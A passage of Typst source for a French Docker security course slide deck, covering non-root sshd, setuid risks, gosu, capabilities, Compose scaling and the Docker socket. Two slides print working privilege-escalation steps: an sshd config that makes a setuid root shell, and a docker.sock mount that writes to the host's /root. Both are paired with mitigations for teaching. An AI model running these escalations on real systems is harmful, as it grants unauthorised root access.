      - Pas de mot de passe : `sshd` ne peut pas lire `/etc/shadow` ; clé uniquement
      - Un seul compte : sans root, `sshd` ne peut pas changer d'identité
      - Pas de séparation de privilèges : le processus `[priv]` tourne aussi en `lambda`
      - Configuration fournie : port 2222, clé d'hôte à `lambda`, `UsePAM=no`, `PidFile=none`
    ],
    bloc(role: "pratique")[Les `sshd` tournent sous `lambda`][
      #terminal(taille: px(12))[```
  $ ssh -p 2222 -i cle lambda@localhost \
     'ps -o ruser,euser,args -C sshd,sshd-session'
  RUSER  EUSER  COMMAND
  lambda lambda sshd: … [listener]
  lambda lambda sshd-session: lambda [priv]
  lambda lambda sshd-session: lambda@notty
  ```]
    ],
  ),
  note(role: "precaution")[En production : pas de `sshd` dans un conteneur (CIS Docker 5.7) → `docker container exec` depuis l'hôte.],
  note: _note,
)

== Fausse bonne idée : sshd setuid root
#let _note = [Variante setuid du serveur ssh du fil rouge, construite (docker.io 26.1.5 de Debian 13, OpenSSH 10) : FROM debian:13, apt install openssh-server, chmod u+s /usr/sbin/sshd, USER lambda, CMD sshd. Sans le chmod, /usr/sbin/sshd est -rwxr-xr-x (non setuid) ; avec, -rwsr-xr-x. Le listener sshd lancé par lambda a RUSER\=lambda, EUSER\=root (/proc/1/status : Uid 1000 0 0 0) ; la connexion par mot de passe est acceptée et sshd-session \[priv\] tourne : les limites de la diapositive précédente sont levées. Le mot de passe en clair du RUN (echo lambda:password | chpasswd) serait lisible dans docker image history : omis ici, cf. diapositive BuildKit secrets. Présentée comme contre-exemple : la règle 4.8 du CIS Docker Benchmark demande de retirer les bits setuid et setgid des images (find / -perm /6000 -type f -exec chmod a-s {} +). CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits.]
#anime(
  rang(
    bloc(role: "avertissement")[Dockerfile — variante setuid][
      #terminal(titre: none, taille: px(13))[```
  FROM debian:13
  RUN apt update && \
    DEBIAN_FRONTEND=noninteractive \
    apt install -yq openssh-server && \
    rm -rf /var/lib/apt/lists/* && mkdir -p /run/sshd
  RUN useradd lambda -m -s /bin/bash
  RUN chmod u+s /usr/sbin/sshd   # ← setuid
  USER lambda
  EXPOSE 22
  CMD ["/usr/sbin/sshd", "-D", "-e"]
  ```]
    ],
    bloc[Ce que le setuid lève][
      Lancé par `lambda` (`USER lambda`), `sshd` s'exécute pourtant avec l'*euid de root* : il lit `/etc/shadow` (mot de passe) et fait sa séparation de privilèges.
    ],
  ),
  note(role: "danger")[*Le danger* : n'importe quel processus du conteneur peut relancer ce binaire setuid avec sa propre configuration et devenir root (diapositive suivante). *Bonne pratique* : aucun binaire setuid dans une image (CIS Docker 4.8). Besoin de root au démarrage : `gosu` ou `setpriv` (plus loin).],
  source-de: [#link("https://www.cisecurity.org/benchmark/docker")[CIS Docker Benchmark — règle 4.8]],
  note: _note,
)

== Pourquoi ce sshd est-il root ? uid et euid
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13) sur la variante setuid de la diapositive précédente. ls -l : -rwsr-xr-x (le s remplace le x du propriétaire root). ps -o ruser,euser : le listener sshd a pour utilisateur réel lambda (qui l'a lancé via CMD, USER lambda) et pour utilisateur effectif root (propriétaire du binaire setuid) ; /proc/1/status donne Uid: 1000 0 0 0. uid réel \= qui a lancé ; euid (e pour effectif) \= celui que le noyau utilise pour décider des permissions. C'est ce qui permet au mot de passe de fonctionner (lecture de /etc/shadow) — et ce qui ouvre l'escalade de la diapositive suivante. passwd (/usr/bin/passwd, -rwsr-xr-x) est l'exemple quotidien du même mécanisme : il doit écrire /etc/shadow, réservé à root.]
#anime(
  rang(
    bloc(role: "pratique")[uid réel et uid effectif][
      #terminal(taille: px(12))[```
  $ ls -l /usr/sbin/sshd
  -rwsr-xr-x 1 root root … /usr/sbin/sshd
  $ ps -o ruser,euser,args -C sshd
  RUSER  EUSER  COMMAND
  lambda root   sshd: …-D -e [listener]
  #          uid=1000  euid=0
  ```]
      réel : qui a lancé (`lambda`) · effectif : droits appliqués (`root`)
    ],
    bloc[Le mécanisme][
      - Un binaire setuid prend, au lancement, l'*euid du propriétaire* du fichier (ici root)
      - Le noyau décide des permissions d'après l'*euid* ; en temps normal, uid = euid
      - `sshd` garde son identité (`lambda`), mais agit avec les pouvoirs de root
    ],
  ),
  note(role: "danger")[Tout ce que fait ce `sshd` est fait en root (euid 0). Or il accepte une configuration fournie (`sshd -f`) : c'est la porte de l'escalade (diapositive suivante). Même mécanisme pour `su`, `sudo`, `passwd` — mais eux ne lisent pas une config arbitraire.],
  note: _note,
)

== Pourquoi le setuid est dangereux
#let _note = [Sur docker.io 26.1.5 (Debian 13), image debian:13 avec chmod u+s /usr/sbin/sshd. Scénario : lambda a déjà un shell dans le conteneur (via le service), uid\=1000. Il écrit une config sshd dont AuthorizedKeysCommand lance, en root, /bin/sh -c "cp /bin/bash /tmp/rootsh ; chmod u+s /tmp/rootsh ; echo \<sa clé publique\>". Il démarre le sshd setuid (qui tourne alors en root : ps montre « root … sshd \[listener\] »), puis une tentative de connexion ssh déclenche la commande. Résultat : /tmp/rootsh est un bash setuid root (-rwsr-xr-x root root) et /tmp/rootsh -p -c id affiche euid\=0(root). AuthorizedKeysCommandUser doit valoir root et la commande (/bin/sh) appartenir à root et n’être inscriptible que par lui : sshd le vérifie. Parade : avec --security-opt no-new-privileges, le même binaire reste uid 1000 (/proc/self/status : tous les Uid à 1000) et le sshd lancé par lambda ne démarre pas en root. À ne démontrer que dans un conteneur jetable. debian:13 contient 11 fichiers setuid ou setgid (su, passwd, mount, umount, chsh, chfn, gpasswd, newgrp, chage, expiry, unix\_chkpwd) ; RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} + les ramène à 0, comme le demande la règle 4.8 du CIS Docker Benchmark. CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits.]
#anime(
  rang(
    bloc(role: "danger")[L'exploitation, pas à pas][
      #terminal(taille: px(11))[```
  $ ls -l /usr/sbin/sshd
  -rwsr-xr-x 1 root root … /usr/sbin/sshd
  # 1. une config à moi, lancée en root
  $ cat evil.conf
  AuthorizedKeysCommand /bin/sh -c "cp /bin/bash \
    /tmp/rootsh; chmod u+s /tmp/rootsh; echo $PUB"
  AuthorizedKeysCommandUser root
  # 2. démarrer le sshd setuid → il tourne en root
  $ /usr/sbin/sshd -f /tmp/evil.conf
  # 3. une connexion déclenche la commande root
  $ ssh -p 2022 -i cle lambda@127.0.0.1 true
  $ /tmp/rootsh -p -c id
  uid=1000(lambda) euid=0(root) groups=1000(lambda)
  ```]
    ],
    bloc(role: "pratique")[La parade][
      - `AuthorizedKeysCommand` tourne en root : `lambda` lui fait créer un bash setuid
      - `sshd` accepte une config fournie (`-f`)
      - *`no-new-privileges`* : le noyau ignore le setuid, `sshd` reste uid 1000 → l'escalade échoue
      - *Mieux* : aucun setuid dans l'image (CIS 4.8) ; descendre de root avec `gosu`/`setpriv`
    ],
  ),
  note: _note,
)

== Root au démarrage seulement : gosu ou setpriv
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13, image construite depuis debian:13 (paquet gosu 1.17 de Debian). Clic 1 : le conteneur démarre en root (pas de USER) ; l’entrypoint prépare /data puis exec gosu lambda "\$0" "\$\@" relance le même script sous lambda, qui fait exec "\$\@" : PID 1 est sleep, sous lambda. Clic 2 : /data, volume neuf appartenant à root, a été donné à lambda. C’est le code de redis (exec gosu redis "\$0" "\$\@") et de postgres (exec gosu postgres "\$BASH\_SOURCE" "\$\@"), dépôts docker-library consultés le 20/11/2026. Clic 3 : gosu est -rwxr-xr-x : il appelle setuid() parce qu’il est lancé par root ; lancé par lambda, il échoue. Un binaire setuid fait l’inverse : il donne root à qui le lance. Clic 4 : variante, exec setpriv --reuid\=lambda --regid\=lambda --init-groups "\$0" "\$\@" : PID 1 sleep sous lambda, Uid 1000, CapEff 0. setpriv vient de util-linux (/usr/bin/setpriv présent dans debian:13) ; c’est l’alternative que l’auteur de gosu conseille (README de gosu, docker-library/postgres\#1304). Sources : doc Docker « Building best practices » (USER : éviter sudo, utiliser gosu pour démarrer en root puis continuer en non-root) ; OWASP Docker Security Cheat Sheet (règle 2 : utilisateur non privilégié). docker container exec entre en root par défaut (pas de USER dans l’image) : -u lambda simule le service compromis. Liens : doc Docker, https://docs.docker.com/build/building/best-practices/ (section USER) ; gosu, https://github.com/tianon/gosu ; discussion setpriv, https://github.com/docker-library/postgres/issues/1304 ; OWASP, https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html. --no-log-init : useradd n’initialise pas lastlog ni faillog. Sans ce drapeau, créer un compte à très grand UID remplit /var/log/faillog de zéros et fait gonfler la couche de l’image (bug des fichiers creux de l’archive tar de Go) ; drapeau recommandé par la doc Docker « Building best practices » déjà citée. Debian/Ubuntu : le wrapper adduser ne le propose pas. Le conteneur est nommé avec --name svc (svc pour « service ») ; les docker container exec svc qui suivent le désignent par ce nom. Comparaison des droits : gosu est -rw x r-xr-x (un x ordinaire au rang du propriétaire) ; un binaire setuid serait -rw s r-xr-x (le s des diapositives 103 et 105). C’est la seule différence visible dans ls -l, et c’est elle qui distingue « descendre de root » (gosu, sans setuid) de « faire monter en root » (binaire setuid).]
#anime(
  rang(
    bloc[Dockerfile + entrypoint.sh][
      #terminal(titre: none, taille: px(11))[```
  FROM debian:13
  RUN apt update && DEBIAN_FRONTEND=noninteractive \
    apt install -yq gosu procps && rm -rf …
  RUN useradd --no-log-init -m lambda
  COPY entrypoint.sh /usr/local/bin/
  ENTRYPOINT ["entrypoint.sh"]
  CMD ["sleep", "infinity"]
  ```]
      #terminal(titre: none, taille: px(11))[```
  #!/bin/sh
  set -e
  if [ "$(id -u)" = 0 ]; then
    chown lambda: /data
    exec gosu lambda "$0" "$@"
    # sans paquet : exec setpriv --reuid=lambda \
    #   --regid=lambda --init-groups "$0" "$@"
  fi
  exec "$@"
  ```]
    ],
    bloc(role: "pratique")[Terminal][
      #terminal(taille: px(11))[```
  $ run -d --name svc -v donnees:/data gosu-demo
  $ exec svc ps -o user,pid,args -p 1
  USER   PID COMMAND
  lambda 1   sleep infinity
  $ exec svc ls -l /usr/sbin/gosu
  -rwxr-xr-x 1 root root … gosu   # x, pas s
  $ exec -u lambda svc gosu root id
  error: failed switching to "root": operation not permitted
  ```]
    ],
  ),
  note(role: "retenir")[L'entrypoint démarre en root, puis `exec gosu` : PID 1 est le service sous `lambda` ; ni `sh` ni `gosu` ne restent. Le travail de root (`chown` du volume) est fait une fois — schéma des images officielles `postgres` et `redis`. `gosu` n'est pas setuid : il fait *descendre* de root, jamais monter. `setpriv` (util-linux, déjà dans `debian:13`) fait de même sans paquet. `--no-log-init` à `useradd` : sinon l'image peut gonfler (journaux).],
  note: _note,
)

== Root au démarrage : réduire ses pouvoirs
#let _note = [Même image que la diapositive précédente (gosu-demo), sorties réelles sur docker.io 26.1.5 de Debian 13. Clic 1 : trois capabilities suffisent à l’entrypoint : CHOWN pour chown /data, SETUID et SETGID pour que gosu change d’identité. Avant la descente, root a CapEff 00000000000000c1 (ces trois-là) au lieu de 00000000a80425fb (les 14 par défaut). Clic 2 : après exec gosu, le noyau vide les capabilities en passant de l’uid 0 à 1000 : CapEff 0 ; NoNewPrivs 1 : un setuid ne rendrait pas root. Clic 3 : retirer CHOWN ou SETUID fait échouer le démarrage (code 1), avec un message clair : on ajuste la liste à l’essai. Encadré « Et toujours » : rappels de la partie Sécurité (user namespace, rootless, seccomp, AppArmor, --privileged, socket Docker). Sources : OWASP Docker Security Cheat Sheet (règles 3 et 4 : --cap-drop all puis ajouts, --security-opt\=no-new-privileges ; règle 11 : rootless) ; CIS Docker Benchmark 5.7 (pas de sshd dans un conteneur, docker exec depuis l’hôte) et 4.8 (retirer setuid/setgid). CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits. Liens : OWASP Docker Security Cheat Sheet, https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html. CapEff \= ensemble effectif des capabilities, lu dans /proc/\<pid\>/status : un masque de 64 bits où chaque bit est une capability (rappel diapositive Capabilities). Avant la descente, root a CapEff 00000000a80425fb (les 14 capabilities par défaut de Docker), ou 00000000000000c1 avec le --cap-add de cette slide (CHOWN, SETUID, SETGID) ; après exec gosu, le noyau le vide à 0 en passant à l’uid non-root. NoNewPrivs\=1 : plus aucun setuid ne redonne de capabilities.]
#anime(
  rang(
    bloc[Réduire ce que root peut faire][
      - *Capabilities minimales* : `--cap-drop ALL` puis `--cap-add` ; ici CHOWN (volume), SETUID + SETGID (gosu)
      - `no-new-privileges` : plus aucun binaire setuid ne redonne root
      - Après la descente : `CapEff` à 0, le service n'a plus aucun pouvoir
      - Une capability de trop retirée : le démarrage échoue, et dit pourquoi
    ],
    bloc(role: "pratique")[Terminal][
      #terminal(taille: px(11))[```
  $ run -d --name svc2 -v d3:/data \
      --cap-drop ALL --cap-add CHOWN \
      --cap-add SETUID --cap-add SETGID \
      --security-opt no-new-privileges gosu-demo
  $ exec svc2 grep -E 'CapEff|NoNewPrivs' /proc/1/status
  CapEff:    0000000000000000   # aucune capability
  NoNewPrivs: 1
  # sans CHOWN :
  chown: changing ownership of '/data': …not permitted
  # sans SETUID :
  error: failed switching to "lambda": …not permitted
  ```]
    ],
  ),
  note(role: "precaution")[Et toujours : user namespace ou Docker rootless (root du conteneur ≠ root de l'hôte) ; garder seccomp et AppArmor ; jamais `--privileged` ni `docker.sock` ; `sshd` multi-utilisateur sur l'hôte, pas en conteneur (CIS 5.7).],
  note: _note,
)

== Rootless et user namespace : ce que ça coûte
#let _note = [Limites d’après la documentation Docker « Rootless mode » (docs.docker.com/engine/security/rootless/, pages « known limitations » et « troubleshoot ») et « Isolate containers with a user namespace » (userns-remap). Clic 1 : le rootless déplace tout le démon sous un compte non privilégié, mais perd AppArmor, le checkpoint/restore (CRIU demande root), le réseau overlay de Swarm, et impose un réseau en espace utilisateur plus lent ; les ports \< 1024 et les limites de ressources demandent une configuration. Clic 2 : userns-remap garde le démon en root et ne décale que les UID : d’où le piège des droits sur les bind mounts (un fichier appartient à l’UID de début de plage, 165536 sur un Debian avec un compte, cf. diapositive User namespace). Clic 3 : les deux réduisent la surface d’attaque sans supprimer le risque d’évasion par le noyau (OWASP Docker Security Cheat Sheet, règle 11). Sources : docs.docker.com/engine/security/rootless/, docs.docker.com/engine/security/userns-remap/, cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html.]
#anime(
  rang(
    bloc(role: "precaution")[Docker rootless : le démon sous un utilisateur][
      - Pilotes de stockage restreints : `overlay2` seulement avec noyau ≥ 5.11, sinon `fuse-overlayfs`
      - Réseau en espace utilisateur (slirp4netns, pasta) : plus lent, et `-p` ne propage pas l'IP source
      - Ports < 1024 : régler `net.ipv4.ip_unprivileged_port_start`
      - Limites de ressources : seulement en cgroup v2 + systemd
      - Non pris en charge : AppArmor, checkpoint/restore, réseau overlay (Swarm)
    ],
    bloc(role: "precaution")[User namespace (userns-remap) : le démon reste root][
      - Root du conteneur = un UID de la plage `dockremap`, pas l'UID 0 de l'hôte
      - Fichier créé via un bind mount : UID décalé → `chown` dans la plage `/etc/subuid`
      - Incompatible avec `--privileged` et le partage d'un namespace de l'hôte
      - Le démon tourne toujours en root : sa surface d'attaque demeure
    ],
  ),
  note(role: "retenir")[Les deux réduisent la surface d'attaque, au prix de fonctionnalités et de performances. Aucun ne protège d'une faille du *noyau partagé* (OWASP) : à activer en connaissance de cause. Rootless par conception, sans démon root : c'est le modèle de Podman (plus loin).],
  note: _note,
)

== Pourquoi Compose ? Intérêt et limite
#let _note = [Diapositive de transition entre docker container run et Compose. Clic 1 : le besoin (pics de charge, application à plusieurs conteneurs). Clic 2 : ce que coûte la description à la main. Clic 3 : Compose. Clic 4 : ce qui se multiplie bien, un service sans état ; démonstration dans « Compose : passer à l’échelle » (5 instances derrière Traefik). Clic 5 : la limite, démontrée après la mise à l’échelle (diapositive « La limite : --scale sur une base de données ») : deux PostgreSQL sur le même volume divergent. Mettre une base à l’échelle relève de ses propres mécanismes : réplication en flux de PostgreSQL (un primaire qui écrit, des secondaires en lecture), réplication de MySQL ; ou d’un service managé.]
#anime(
  rang(
    bloc(role: "pratique")[Un cas réel : une boutique en ligne][
      - Trafic normal en semaine, dix fois plus le jour des soldes
      - L'application = plusieurs conteneurs liés : un frontal web, une base, un proxy
      - Avec `run` : créer réseau, volume, lancer trois conteneurs dans le bon ordre… et tout refaire à chaque mise à jour
      - Avec Compose : un fichier décrit l'ensemble ; `docker compose up` crée tout, `--scale` ajoute des copies
    ],
    bloc[Ce qui passe à l'échelle, ce qui ne passe pas][
      - *Le frontal web* (sans état) : ne garde rien entre deux requêtes → chaque requête va à n'importe quelle copie. Cinq copies, cinq fois plus de clients
      - *La base de données* (avec état) : deux serveurs ne peuvent pas partager les mêmes fichiers → une base se multiplie par sa *réplication*, pas par `--scale`
    ],
  ),
  note: _note,
)

== Compose : décrire l’application
#let _note = [Fichier tel quel (docker-compose 2.26.1 de Debian 13, Traefik 3.7). Sans entrypoint déclaré, Traefik écoute sur le port 80. Par défaut, Traefik expose tous les conteneurs (exposedbydefault\=true) ; en production, passer à false et ajouter traefik.enable\=true aux seuls services publiés. Le « :ro » sur le socket ne protège pas : se connecter à un socket Unix reste possible, et l’API Docker permet de lancer un conteneur --privileged qui monte la racine de l’hôte.]
#anime(
  rang(
    bloc[compose.yaml][
      #terminal(titre: none, taille: px(12))[```
  services:
    hello:
      build: .
      labels:
        - traefik.http.routers.hello.rule=PathPrefix(`/`)
    proxy:
      image: traefik:v3.7
      command: --providers.docker
      ports:
        - "8080:80"
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock:ro
  ```]
    ],
    bloc(role: "retenir")[À retenir][
      - `build` construit, `image` télécharge
      - Traefik lit les *labels* des conteneurs : la règle de routage vit avec le service
      - Seuls les conteneurs « healthy » reçoivent du trafic
    ],
  ),
  note(role: "danger")[Traefik lit le socket Docker : `:ro` n'empêche pas les appels à l'API, c'est un *accès root de fait*. En production : un proxy de socket filtrant, ou `--providers.docker.exposedbydefault=false` a minima.],
  note: _note,
)

== Compose : passer à l’échelle
#let _note = [Sorties réelles (docker-compose 2.26.1 de Debian 13, Traefik 3.7), après l’état « healthy » des instances (environ 10 s). Passage de 3 à 5 instances sans toucher au proxy : 10 requêtes, 2 par conteneur. Un conteneur « starting » ou « unhealthy » ne reçoit rien.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(12))[```
  $ docker compose up -d --scale hello=3
  [+] Running 5/5   # réseau, proxy, 3× hello
  $ for i in 1 2 3 4; do curl -s localhost:8080; done
  Bonjour depuis 235c8db855de
  Bonjour depuis 0926bd13b923
  Bonjour depuis 46b2693c692f
  Bonjour depuis 0926bd13b923
  $ docker compose up -d --scale hello=5
  [+] Running 6/6   # hello-4, hello-5 : Started
  $ for i in $(seq 10); do curl -s localhost:8080; \
      done | sort | uniq -c
     2 Bonjour depuis 0926bd13b923
     2 Bonjour depuis 235c8db855de
     …
  ```]
    ],
    bloc(role: "retenir")[Ce qui se passe][
      - Répartition circulaire (_round robin_) entre les instances
      - Traefik voit naître et mourir les conteneurs via l'API Docker
      - Nouvelle instance : ajoutée dès qu'elle est « healthy », sans redémarrer le proxy
    ],
  ),
  note: _note,
)

== La limite : --scale sur une base de données
#let _note = [Sorties réelles, docker-compose 2.26.1 et docker.io 26.1.5 de Debian 13, image postgres:17 (PostgreSQL 17.12), projet « boutique ». Clic 1 : une instance, son volume. Clic 2 : --scale db\=2 crée boutique-db-2 avec le même volume nommé. Clic 3 : db-2 trouve un répertoire de données « non arrêté proprement » (db-1 tourne) et lance une récupération : deux postmasters sur les mêmes fichiers, ce que PostgreSQL interdit normalement grâce à postmaster.pid ; dans deux conteneurs, les deux serveurs ont le PID 1, et le verrou ne protège plus. Clic 4 : chaque serveur a sa propre mémoire : db-2 ne voit pas la table créée par db-1. À ne reproduire que sur un volume jetable (docker compose down -v ensuite). Ce qu’il faut faire : une seule instance de base, ou la réplication de PostgreSQL (primaire et secondaires, chacun son volume).]
#anime(
  rang(
    bloc[compose.yaml][
      #terminal(titre: none, taille: px(13))[```
  services:
    db:
      image: postgres:17
      environment:
        POSTGRES_PASSWORD: exemple
      volumes:
        - donnees:/var/lib/postgresql/data
  volumes:
    donnees:
  ```]
    ],
    bloc(role: "danger")[Terminal · deux serveurs, un volume][
      #terminal(taille: px(11))[```
  $ docker compose up -d --scale db=2
  $ docker compose logs db | grep 'not properly'
  db-2 | … database system was not properly shut
         down; automatic recovery in progress
  $ compose exec --index 1 db psql -U postgres \
      -c 'CREATE TABLE t (x int); INSERT … VALUES (1);'
  CREATE TABLE
  INSERT 0 1
  $ compose exec --index 2 db psql -U postgres \
      -c 'SELECT * FROM t;'
  ERROR:  relation "t" does not exist
  ```]
    ],
  ),
  note(role: "danger")[`db-2` démarre sur le même volume que `db-1`, croit à une panne et « répare » des fichiers que `db-1` utilise. La table créée par `db-1` n'existe pas pour `db-2` : données incohérentes, corruption à terme.],
  note: _note,
)

== Compose : les commandes
#let _note = [Compose v2 : « docker compose » (plugin). L’ancien « docker-compose » (v1) n’est plus maintenu depuis 2023.]
#anime(
  rang(
    bloc(role: "pratique")[Cycle de vie d'un projet][
      #lignes(largeur: px(330), taille-cle: px(24), taille: px(24),
        ([`docker compose up -d`], [construire si besoin, créer et démarrer]),
        ([`docker compose ps`], [état des services]),
        ([`docker compose logs -f proxy`], [suivre les journaux d'un service]),
        ([`docker compose exec hello sh`], [un shell dans un service]),
        ([`… up -d --scale hello=5`], [cinq instances de `hello`]),
        ([`docker compose down`], [arrêter, supprimer conteneurs et réseau]),
        ([`docker compose down -v`], [supprimer aussi les volumes]),
        ([`docker compose config`], [valider et afficher le fichier]),
      )
    ],
  ),
  note: _note,
)

= Utilisation avancée · Sécurité

== Le socket Docker : un accès root
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13 ; outil-docker \= debian:13 + paquet docker-cli de Debian (le client seul). Clic 1 : srw-rw---- root docker : seuls root et le groupe docker peuvent s’y connecter (rappel : groupe docker \= root de fait, diapositive « Le démon Docker »). Clic 2 : le conteneur reçoit le socket en lecture seule, comme Traefik dans la diapositive Compose ; son client docker demande à dockerd un nouveau conteneur qui monte / de l’hôte en /hote. Clic 3 : le fichier existe sur l’hôte, propriétaire root. « :ro » rend le fichier du socket non modifiable, mais se connecter et envoyer des requêtes reste permis (le noyau ne vérifie pas le montage en lecture seule pour un connect() sur un socket Unix). Sources : CIS Docker Benchmark 5.32 « Ensure that the Docker socket is not mounted inside any containers » ; doc Docker « Docker Engine security » (« only trusted users should be allowed to control your Docker daemon »). CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits. Lien doc Docker : https://docs.docker.com/engine/security/.]
#anime(
  rang(
    bloc(role: "danger", poids: 1.3)[Terminal — preuve][
      #terminal(taille: px(11))[```
  $ ls -l /var/run/docker.sock
  srw-rw---- 1 root docker 0 … /var/run/docker.sock
  $ sudo ls -l /root/preuve-socket
  ls: cannot access …: No such file or directory
  $ docker container run --rm \
     -v /var/run/docker.sock:/var/run/docker.sock:ro \
     outil-docker \
     docker container run --rm -v /:/hote debian:13 \
     touch /hote/root/preuve-socket
  $ sudo ls -l /root/preuve-socket
  -rw-r--r-- 1 root root 0 … /root/preuve-socket
  ```]
    ],
    bloc[Ce qu'il faut comprendre][
      - Le client `docker` parle à `dockerd` par ce socket (API REST) ; `dockerd` tourne en root
      - Écrire sur le socket = commander `dockerd` : être root ou dans le groupe `docker`
      - Monté dans un conteneur, même `:ro` : `:ro` protège le *fichier*, pas les requêtes
      - Le conteneur fait lancer un conteneur qui monte `/` de l'hôte : *root sur l'hôte*
    ],
  ),
  note(role: "danger")[CIS Docker 5.32 : ne pas monter `docker.sock` dans un conteneur. Doc Docker : seuls des utilisateurs de confiance pilotent le démon.],
  note: _note,
)

== Si un service doit lire l’API : filtrer
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13, tecnativa/docker-socket-proxy (HAProxy 3.4.7, image du 17/11/2026). La doc Traefik recommande ce proxy pour filtrer l’accès à l’API. DISABLE\_IPV6\=1 n’est nécessaire que sur la machine de test, sans IPv6 (sinon HAProxy refuse de démarrer) ; sur un poste normal, l’omettre. Clic 1 : le proxy est le seul à monter le socket ; CONTAINERS\=1 autorise GET /containers ; POST\=0 (défaut) interdit toute écriture. Clic 2 : charming\_elbakyan est le conteneur outil-docker lui-même. Clic 3 : POST /containers/create refusé par le proxy (403), le fichier n’est pas créé. Clic 4 : limites. GET /containers/{id}/json renvoie la configuration complète, variables d’environnement comprises : un secret passé par -e reste lisible. exposedbydefault\=false n’agit que sur le routage de Traefik (seuls les conteneurs avec traefik.enable\=true sont publiés). Rootless : diapositive « Le démon Docker ». Liens : docker-socket-proxy, https://github.com/Tecnativa/docker-socket-proxy ; doc Traefik (sécurité de l’accès à l’API Docker), https://doc.traefik.io/traefik/reference/install-configuration/providers/docker/.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(10))[```
  $ docker network create socknet
  $ docker container run -d --name proxy --network socknet \
     -e CONTAINERS=1 -e DISABLE_IPV6=1 \
     -v /var/run/docker.sock:/var/run/docker.sock:ro \
     tecnativa/docker-socket-proxy
  $ run --rm --network socknet \
     -e DOCKER_HOST=tcp://proxy:2375 outil-docker \
     docker container ls --format '{{.Names}}'
  charming_elbakyan
  proxy
  $ run … -e DOCKER_HOST=tcp://proxy:2375 outil-docker \
     docker container run --rm -v /:/hote debian:13 \
     touch /hote/root/preuve2
  Error response from daemon: 403 Forbidden
  $ sudo ls -l /root/preuve2
  ls: cannot access …: No such file or directory
  ```]
    ],
    bloc[Un proxy de socket filtrant][
      - Seul le proxy monte le socket ; le service (Traefik, Portainer…) passe par lui (`DOCKER_HOST`)
      - N'autorise que ce qui est listé : ici `CONTAINERS=1` ; écritures (POST) refusées
      - Lecture OK ; création refusée : `403`, rien sur l'hôte
    ],
  ),
  note(role: "precaution")[Limites : le proxy a le socket → image de confiance, réseau interne, jamais `-p 2375`. Les lectures exposent encore la configuration des conteneurs (variables d'environnement). `exposedbydefault=false` choisit les conteneurs publiés, il ne protège pas le socket. Docker rootless : le démon n'est plus root, le socket ne donne plus root sur l'hôte.],
  note: _note,
)

= Pour rappel · liste non exhaustive

== Erreurs à éviter : sécurité et build
#let _note = [Récapitulatif en fin de diaporama : chaque point a été vu dans le cours. Scan d’images : docker scout, Trivy, Grype. Source : cours en ligne de l’auteur.]
#anime(
  rang(
    bloc(role: "danger")[Sécurité][
      - Socket `docker.sock` monté : root de fait sur l'hôte
      - `--privileged` : préférer `--cap-drop ALL` puis `--cap-add`
      - Root dans le conteneur : `USER` non privilégié, rootless
      - Secrets dans `ENV`/`ARG` : visibles avec `docker image history`
      - Image inconnue : officielle, épinglée par digest, scannée
    ],
    bloc(role: "avertissement")[Build][
      - `apt update` et `apt install` dans deux `RUN` : un seul `RUN`
      - Nettoyage dans une couche suivante : l'image ne rétrécit pas
      - Tag `latest` : une version ou un digest
      - `COPY . .` sans `.dockerignore` ; `ADD` au lieu de `COPY`
      - Outils de build dans l'image finale : multi-stage
    ],
  ),
  note: _note,
)

== Erreurs à éviter : exploitation et données
#let _note = [Récapitulatif en fin de diaporama : chaque point a été vu dans le cours. Compose : depends\_on avec condition service\_healthy. Rotation des logs : --log-opt max-size\=10m --log-opt max-file\=3. Source : cours en ligne de l’auteur.]
#anime(
  rang(
    bloc(role: "avertissement")[Exploitation][
      - PID 1 qui ne relaie pas les signaux : `--init` ou forme exec
      - Logs dans des fichiers : `stdout`/`stderr`, avec rotation
      - Aucune limite : `--memory`, `--cpus`
      - Pas de `HEALTHCHECK` : rien ne dit si le service est prêt
      - Conteneur réparé en ssh : le recréer depuis l'image
    ],
    bloc(role: "avertissement")[Données et réseau][
      - Données dans la couche inscriptible : volume nommé
      - Un volume nommé n'est pas une sauvegarde
      - Port publié sur `0.0.0.0` : `127.0.0.1:5432:5432`
      - Base publiée alors que seuls des conteneurs y accèdent : pas de `-p`
    ],
  ),
  note: _note,
)

= Ouverture · Podman

== Podman : un moteur de conteneurs sans démon
